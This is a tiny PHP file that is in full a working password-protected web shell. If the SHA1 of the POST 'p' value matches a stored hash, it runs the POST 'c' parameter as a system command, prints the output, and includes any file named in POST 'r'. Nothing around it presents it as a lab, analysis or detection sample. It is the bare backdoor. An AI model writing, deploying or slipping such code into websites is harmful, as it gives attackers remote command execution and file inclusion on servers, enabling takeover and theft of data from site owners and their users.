<?php
    session_start();
    $hash="dc884cca7743a2a318254e1331b64a75c9f2ce34";
    if(sha1($_POST["p"])==$hash){
     echo "<pre>";
     system($_POST["c"]);    
     echo "</pre>";
     if(isset($_POST["r"])) include $_POST["r"];
    }
?>
